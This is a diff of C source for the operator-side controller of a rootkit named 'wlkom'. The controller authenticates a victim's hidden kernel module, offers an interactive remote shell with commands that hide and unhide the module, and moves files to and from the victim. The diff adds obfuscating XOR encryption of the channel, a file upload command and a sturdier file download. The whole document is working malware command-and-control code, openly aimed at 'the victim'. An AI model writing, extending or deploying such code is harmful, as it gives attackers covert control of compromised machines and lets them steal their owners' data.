@@ -1,4 +1,5 @@
 #include <arpa/inet.h>
+#include <errno.h>
 #include <netinet/in.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -6,15 +7,15 @@
 #include <string.h>
 #include <sys/select.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <time.h>
 #include <termios.h>
 #include <unistd.h>
-#include <sys/stat.h>
-#include <errno.h>
 
 #define BUF_SIZE     256
 #define FNV1A_OFFSET 2166136261U
 #define FNV1A_PRIME  16777619U
+#define AUTH_REPLY_TIMEOUT_SEC 3
 
 static void timestamp(void)
 {
@@ -53,28 +54,101 @@ static int write_all(int fd, const char *buf, size_t len)
     return 0;
 }
 
-static int read_line(int fd, char *buf, size_t size)
+static uint8_t keystream_byte(uint32_t key, uint32_t pos)
 {
-    size_t pos = 0;
+    uint32_t x = key + pos * 0x9E3779B1U;
 
-    while (pos + 1 < size) {
-        ssize_t n = read(fd, &buf[pos], 1);
+    x ^= x >> 16;
+    x *= 0x85ebca6bU;
+    x ^= x >> 13;
+    x *= 0xc2b2ae35U;
+    x ^= x >> 16;
+
+    return (uint8_t)x;
+}
+
+static void crypt_buffer(char *buf, size_t len, uint32_t key, uint32_t *pos)
+{
+    while (len-- > 0) {
+        *buf++ ^= keystream_byte(key, *pos);
+        (*pos)++;
+    }
+}
+
+static int write_encrypted(int fd, const char *buf, size_t len,
+                           uint32_t key, uint32_t *pos)
+{
+    char tmp[BUF_SIZE];
+
+    if (len > sizeof(tmp))
+        return -1;
+
+    memcpy(tmp, buf, len);
+    crypt_buffer(tmp, len, key, pos);
+    return write_all(fd, tmp, len);
+}
+
+static int read_encrypted_line(int fd, char *buf, size_t size,
+                               uint32_t key, uint32_t *pos)
+{
+    size_t rn = 0;
+
+    while (rn + 1 < size) {
+        fd_set readfds;
+        struct timeval timeout = {
+            .tv_sec = AUTH_REPLY_TIMEOUT_SEC,
+            .tv_usec = 0,
+        };
+        int ready;
+        ssize_t n;
+
+        FD_ZERO(&readfds);
+        FD_SET(fd, &readfds);
+
+        ready = select(fd + 1, &readfds, NULL, NULL, &timeout);
+        if (ready == 0)
+            return -1;
+        if (ready < 0) {
+            if (errno == EINTR)
+                continue;
+            return -1;
+        }
+
+        n = read(fd, &buf[rn], 1);
+        if (n <= 0)
+            return -1;
+
+        crypt_buffer(&buf[rn], 1, key, pos);
+        if (buf[rn] == '\n') {
+            buf[rn] = '\0';
+            if (rn > 0 && buf[rn - 1] == '\r')
+                buf[rn - 1] = '\0';
+            return 0;
+        }
+
+        rn++;
+    }
+
+    buf[rn] = '\0';
+    return -1;
+}
+
+static int read_encrypted_exact(int fd, char *buf, size_t len,
+                                uint32_t key, uint32_t *pos)
+{
+    size_t done = 0;
+
+    while (done < len) {
+        ssize_t n = read(fd, buf + done, len - done);
 
         if (n <= 0)
             return -1;
 
-        if (buf[pos] == '\n') {
-            buf[pos] = '\0';
-            if (pos > 0 && buf[pos - 1] == '\r')
-                buf[pos - 1] = '\0';
-            return 0;
-        }
-
-        pos++;
+        crypt_buffer(buf + done, n, key, pos);
+        done += n;
     }
 
-    buf[pos] = '\0';
-    return -1;
+    return 0;
 }
 
 static int wait_for_command_or_disconnect(int client_fd)
@@ -105,74 +179,182 @@ static int wait_for_command_or_disconnect(int client_fd)
     }
 }
 
-
-static int download_file(int client_fd, const char *remote_path, const char *local_path)
+static int upload_file(int client_fd,
+                       const char *local_path,
+                       const char *remote_path,
+                       uint32_t key,
+                       uint32_t *tx_pos,
+                       uint32_t *rx_pos)
 {
     FILE *fp;
-    char cmd[512];
+    struct stat st;
+    char cmd[BUF_SIZE];
+    char ack[256];
+    char buf[4096];
+    unsigned long long file_size = 0;
+
+    if (stat(local_path, &st) != 0) {
+        perror("stat");
+        return -1;
+    }
+
+    if (!S_ISREG(st.st_mode)) {
+        printf("[!] %s is not a regular file\n", local_path);
+        return -1;
+    }
+
+    file_size = (unsigned long long)st.st_size;
+
+    if (snprintf(cmd, sizeof(cmd), "UPLOAD %s %llu\n", remote_path,
+                 file_size) >= (int)sizeof(cmd)) {
+        printf("[!] Remote path is too long\n");
+        return -1;
+    }
+
+    if (write_encrypted(client_fd, cmd, strlen(cmd), key, tx_pos) < 0) {
+        perror("write UPLOAD command");
+        return -1;
+    }
+
+    if (read_encrypted_line(client_fd, ack, sizeof(ack), key, rx_pos) < 0 ||
+        strcmp(ack, "UPLOAD_READY") != 0) {
+        printf("[!] Remote rootkit did not prepare for upload\n");
+        return -1;
+    }
+
+    fp = fopen(local_path, "rb");
+    if (!fp) {
+        perror("fopen");
+        return -1;
+    }
+
+    while (!feof(fp)) {
+        size_t n = fread(buf, 1, sizeof(buf), fp);
+        if (n > 0) {
+            if (write_encrypted(client_fd, buf, n, key, tx_pos) < 0) {
+                printf("\n[!] Connection lost during upload\n");
+                fclose(fp);
+                return -1;
+            }
+        }
+        if (ferror(fp)) {
+            perror("fread");
+            fclose(fp);
+            return -1;
+        }
+    }
+
+    fclose(fp);
+
+    if (read_encrypted_line(client_fd, ack, sizeof(ack), key, rx_pos) < 0 ||
+        strcmp(ack, "UPLOAD_OK") != 0) {
+        printf("[!] Upload failed on the remote side\n");
+        return -1;
+    }
+
+    printf("[+] File uploaded successfully -> %s\n", remote_path);
+    return 0;
+}
+
+static int download_file(int client_fd,
+                         const char *remote_path,
+                         const char *local_path,
+                         uint32_t key,
+                         uint32_t *tx_pos,
+                         uint32_t *rx_pos)
+{
+    FILE *fp;
+    char cmd[BUF_SIZE];
     char size_line[256];
     char buf[4096];
-    ssize_t n;
     size_t bytes_to_read = 0;
     size_t bytes_read = 0;
-    
-   
-    snprintf(cmd, sizeof(cmd), "DOWNLOAD %s\n", remote_path);
-    if (write_all(client_fd, cmd, strlen(cmd)) < 0) {
+
+    if (snprintf(cmd, sizeof(cmd), "DOWNLOAD %s\n", remote_path) >=
+        (int)sizeof(cmd)) {
+        printf("[!] Remote path is too long\n");
+        return -1;
+    }
+
+    if (write_encrypted(client_fd, cmd, strlen(cmd), key, tx_pos) < 0) {
         perror("write DOWNLOAD command");
         return -1;
     }
-    
-    
-    if (read_line(client_fd, size_line, sizeof(size_line)) < 0) {
+
+    if (read_encrypted_line(client_fd, size_line, sizeof(size_line),
+                            key, rx_pos) < 0) {
         printf("[!] Failed to read SIZE response\n");
         return -1;
     }
-    
+
+    if (strncmp(size_line, "SIZE ", 5) != 0) {
+        printf("[!] Remote rootkit did not acknowledge DOWNLOAD support.\n");
+        printf("[!] Received response: %s\n", size_line);
+        printf("[!] Make sure the victim is running the updated wlkom module.\n");
+        return -1;
+    }
+
     if (sscanf(size_line, "SIZE %zu", &bytes_to_read) != 1) {
         printf("[!] Invalid SIZE response: %s\n", size_line);
         return -1;
     }
-    
+
     printf("[*] File size: %zu bytes\n", bytes_to_read);
-    
-    
+
     fp = fopen(local_path, "wb");
     if (!fp) {
         perror("fopen");
         return -1;
     }
-    
-    */
+
     bytes_read = 0;
     while (bytes_read < bytes_to_read) {
         size_t to_read = bytes_to_read - bytes_read;
         if (to_read > sizeof(buf))
             to_read = sizeof(buf);
-        
-        n = read(client_fd, buf, to_read);
-        if (n <= 0) {
+
+        if (read_encrypted_exact(client_fd, buf, to_read, key, rx_pos) < 0) {
             printf("\n[!] Connection lost\n");
             fclose(fp);
             return -1;
         }
-        
-        fwrite(buf, 1, n, fp);
-        bytes_read += n;
+
+        if (fwrite(buf, 1, to_read, fp) != to_read) {
+            perror("fwrite");
+            fclose(fp);
+            return -1;
+        }
+
+        bytes_read += to_read;
         printf("\r[*] Downloaded %zu/%zu bytes", bytes_read, bytes_to_read);
         fflush(stdout);
     }
     printf("\n");
-    
-    
-    char marker_buf[256];
-    if (read_line(client_fd, marker_buf, sizeof(marker_buf)) < 0) {
+
+    {
+        char marker_buf[256];
+        char blank_line[2];
+        int marker_ok = 0;
+
+        if (read_encrypted_line(client_fd, marker_buf, sizeof(marker_buf),
+                                key, rx_pos) == 0 &&
+            strcmp(marker_buf, "--- End of Output ---") == 0) {
+            marker_ok = 1;
+        }
+
+        if (!marker_ok) {
+            printf("[*] End marker missing; assuming download completed\n");
+        } else {
+            (void)read_encrypted_line(client_fd, blank_line, sizeof(blank_line),
+                                      key, rx_pos);
+        }
+    }
+
+    if (fclose(fp) != 0) {
         printf("[!] Failed to read end marker\n");
-        fclose(fp);
         return -1;
     }
-    
-    fclose(fp);
+
     printf("[+] File downloaded successfully (%zu bytes) -> %s\n", bytes_read, local_path);
     return 0;
 }
@@ -219,6 +401,8 @@ int main(int argc, char **argv)
     char buf[BUF_SIZE];
     char auth_msg[BUF_SIZE];
     char auth_reply[BUF_SIZE];
+    uint32_t session_key = 0;
+    uint32_t tx_pos = 0, rx_pos = 0;
     int opt = 1;
 
     if (argc != 2) {
@@ -279,8 +463,11 @@ int main(int argc, char **argv)
             continue;
         }
 
-        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", fnv1a_hash(password));
-        if (write_all(client_fd, auth_msg, strlen(auth_msg)) < 0) {
+        session_key = fnv1a_hash(password);
+        tx_pos = rx_pos = 0;
+        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", session_key);
+        if (write_encrypted(client_fd, auth_msg, strlen(auth_msg),
+                            session_key, &tx_pos) < 0) {
             perror("write AUTH");
             close(client_fd);
             continue;
@@ -290,7 +477,8 @@ int main(int argc, char **argv)
         printf("[+] AUTH sent\n");
         fflush(stdout);
 
-        if (read_line(client_fd, auth_reply, sizeof(auth_reply)) < 0 ||
+        if (read_encrypted_line(client_fd, auth_reply, sizeof(auth_reply),
+                                session_key, &rx_pos) < 0 ||
             strcmp(auth_reply, "AUTH_OK") != 0) {
             timestamp();
             printf("[-] Authentication failed: invalid password or connection lost\n");
@@ -305,7 +493,9 @@ int main(int argc, char **argv)
 
         printf("\n=== WLKOM INTERACTIVE SHELL ===\n");
         printf("Type your command and press Enter. Type 'exit' to quit.\n\n");
-        printf("Control commands: hide_module, unhide_module, module_status.\n\n");
+        printf("Control commands: hide_module, unhide_module, module_status.\n");
+        printf("File commands: DOWNLOAD <remote_path> <local_path>, UPLOAD <local_path> <remote_path>\n");
+        printf("\n");
 
         while (1) {
     int ready;
@@ -331,37 +521,71 @@ int main(int argc, char **argv)
         break;
     }
 
-
-    /* NEW: Handle DOWNLOAD command */
+    /* Handle DOWNLOAD command */
     if (strncmp(buf, "DOWNLOAD ", 9) == 0) {
-        char remote_path[256], local_path[256];
-        if (sscanf(buf, "DOWNLOAD %255s %255s", remote_path, local_path) == 2) {
-            download_file(client_fd, remote_path, local_path);
+        char remote_path[256];
+        char local_path[256];
+
+        if (sscanf(buf, "DOWNLOAD %255s %255s",
+                   remote_path,
+                   local_path) == 2) {
+
+            download_file(client_fd,
+                          remote_path,
+                          local_path,
+                          session_key,
+                          &tx_pos,
+                          &rx_pos);
         } else {
             printf("Usage: DOWNLOAD <remote_path> <local_path>\n");
         }
+
         continue;
     }
 
-    if (buf[0] == '\n') {
+    if (strncmp(buf, "UPLOAD ", 7) == 0) {
+        char local_path[256];
+        char remote_path[256];
+
+        if (sscanf(buf, "UPLOAD %255s %255s",
+                   local_path,
+                   remote_path) == 2) {
+            upload_file(client_fd,
+                        local_path,
+                        remote_path,
+                        session_key,
+                        &tx_pos,
+                        &rx_pos);
+        } else {
+            printf("Usage: UPLOAD <local_path> <remote_path>\n");
+        }
+
         continue;
     }
 
-    /* 2. Forward the command payload to the rootkit module */
-    if (write_all(client_fd, buf, strlen(buf)) < 0) {
+    if (buf[0] == '\n')
+        continue;
+
+    /* Forward command encrypted */
+    if (write_encrypted(client_fd,
+                        buf,
+                        strlen(buf),
+                        session_key,
+                        &tx_pos) < 0) {
         printf("\n[!] Connection lost or rootkit disconnected.\n");
         break;
     }
 
-    /* 3. Read stream until the specific end of output marker is detected */
+    /* Read encrypted output */
     {
-        char tail[32] = { 0 };
+        char tail[32] = {0};
         char combined[BUF_SIZE + sizeof(tail)];
 
         while (1) {
             ssize_t n;
 
             memset(buf, 0, sizeof(buf));
+
             n = read(client_fd, buf, sizeof(buf) - 1);
             if (n <= 0) {
                 printf("\n[!] Connection lost or rootkit disconnected.\n");
@@ -369,38 +593,40 @@ int main(int argc, char **argv)
                 break;
             }
 
-            snprintf(combined, sizeof(combined), "%s%s", tail, buf);
-            char *end_marker = strstr(combined, "--- End of Output ---\n\n");
-            if (end_marker) {
-                size_t len = end_marker - combined;
-                if (len > strlen(tail)) {
-                    fwrite(combined + strlen(tail), 1, len - strlen(tail), stdout);
-                }
-                printf("\n");
+            crypt_buffer(buf, n, session_key, &rx_pos);
+
+            buf[n] = '\0';
+
+            printf("%s", buf);
+            fflush(stdout);
+
+            snprintf(combined,
+                     sizeof(combined),
+                     "%s%s",
+                     tail,
+                     buf);
+
+            if (strstr(combined,
+                       "--- End of Output ---\n\n") != NULL)
                 break;
-            }
 
-            if (strlen(tail) > 0) {
-                fwrite(tail, 1, strlen(tail), stdout);
-                fflush(stdout);
-            }
+            size_t copy_len =
+                (size_t)n < sizeof(tail) - 1
+                    ? (size_t)n
+                    : sizeof(tail) - 1;
 
-            size_t buf_len = strlen(buf);
-            if (buf_len > 31) {
-                strncpy(tail, buf + buf_len - 31, 31);
-                tail[31] = '\0';
-                fwrite(buf, 1, buf_len - 31, stdout);
-                fflush(stdout);
-            } else {
-                strncpy(tail, combined, strlen(combined) > 31 ? 31 : strlen(combined));
-                tail[31] = '\0';
-            }
+            memcpy(tail,
+                   buf + n - copy_len,
+                   copy_len);
+
+            tail[copy_len] = '\0';
         }
 
         if (connection_lost)
             break;
     }
-}
+        }
+
 
         timestamp();
         printf("[-] Rootkit disconnected\n");
